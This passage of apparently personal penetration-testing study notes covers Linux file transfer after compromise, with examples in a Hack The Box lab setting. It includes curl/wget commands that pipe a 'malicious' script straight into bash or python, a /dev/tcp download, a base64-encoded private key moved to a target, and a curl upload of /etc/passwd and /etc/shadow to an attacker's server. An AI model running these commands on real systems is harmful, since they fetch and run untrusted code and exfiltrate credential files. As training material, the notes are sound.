linux can use FTP, SMB etc, but nowadays typically it will use HTTP(S)
### Base64 Encoding/Decoding
depending on the file size base64 encoding is an option
use the following flow
```
n00blyfe@htb$ md5sum di_rsa

4e301756a07ded0a2dd6953abf015278 id_rsa

n00blyfe@htb$ cat id_rsa | base64 -w 0; echo

LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=

### move to server

compromisedUser@targetServer$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa

compromisedUser@targetServer$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278 id_rsa
```
### Web Downloads with Wget and cURL
two most common utilities to interact with web apps are `wget` and `curl` and they are installed on many linux distros by default

##### Wget and cURL download examples
```
n00blyfe@htb$ wget https://raw.githubusercontent.com/account/malicious/script.sh -O /tmp/script.sh

n00blyfe@htb$ curl -o /tmp/script.sh https://raw.githubusercontent.com/account/malicious/script.sh
```
### Fileless Attacks
pipes make fileless operations possible. (be aware some payloads such as mkfifo write files to disk. while the payload may be fileless, the script itself may create temporary files on the OS etc)
##### Fileless Download with cURL

```
n00blyfe@htb$ curl https://raw.githubusercontent.com/account/malicious/script.sh | bash
```
##### Fileless Download with wget
```
n00blyfe@htb$ wget https://raw.githubusercontent.com/account/malicious/script.py | python3
```
### Download with Bash (/dev/tcp)
as long as you're using bash version 2.04+ and have --enabled-net-redirections compiled, the built-in /dev/TCP device file can be used for simple file downloads
##### Connect to the target webserver
```
n00blyfe@htb$ exec 3<>/dev/tcp/10.10.10.32/80
```

##### HTTP GET request
```
n00blyfe@htb$ echo -e "GET /script.sh HTTP/1.1\n\n">&3
```

##### Print the respons
```
n00blyfe@htb$ cat <&3
```
### SSH Downloads
you can use `SCP` which comes with `SSH` by default
##### Enable the SSH server
```
n00blyfe@htb$ sudo systemctl enable ssh
```
##### Start the SSH Server
```
n00blyfe@htb$ sudo systemctl start ssh
```
##### oneliner
```
n00blyfe@htb$ sudo systemctl enable ssh && sudo systemctl start ssh
```
##### checking fo SSH listening port
```
n00blyfe@htb$ netstat -lnpt
```

##### Linux - Downloading Files using SCP
```
compromisedUser@targetServer$ scp plaintext@192.168.49.128:/root/myroot.txt .
```
note: you can  and should create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer

### Upload Operations

upload is just like download but in reverse and very similar to windows\
### Web upload
just like in windows we can use uploadserver extended module of python http.server 

##### install extended module 
```
n00blyfe@htb$ sudo python3 -m pip install --user uploadserver
```
##### Create a self-signed certificate
```
n00blyfe@htb$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
ensure you host the certificate elsewhere
##### Start the Web Server

```
n00blyfe@htb$ mkdir https && cd https

n00blyfe@htb:~/https$sudo python3 -m uploadserver 443 --server-certificate /path/to/certificate
```
then from the target we can upload files below we will demo uploading `/etc/passwd` and `/etc/shadow`
```
compromisedUser@targetServer$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadown' --insecure
```
note: we use the --insecure option because it is self-signed and we trust it

### Alternative Web file Transfer Method
linux distros usually have python or php installed, so starting a web server to transfer files is usually pretty trivial. also if the compromised server already is a webserver, we can just use existing infrastructure. 
##### Linux - creating a web Server with Python3
```
n00blyfe@htb$ python3 -m http.server
```

##### Linux - creating a web server with python2,7
```
n00blyfe@htb$ python2.7 -m SimpleHTTPServer
```
##### Linux - Creating a web server with PHP
```
n00blyfe@htb$ php -S 0.0.0.0:8080
```
##### Linux - creating a web server with ruby
```
n00blyfe@htb$ ruby -run -ehttpd . -p8080
```
then just download the file with curl/wget etc
note: inbound traffice may be blocked by firewalls etc if this isn't already a web server

### SCP upload
if `SSH` is allowed you can ues `SCP` to upload files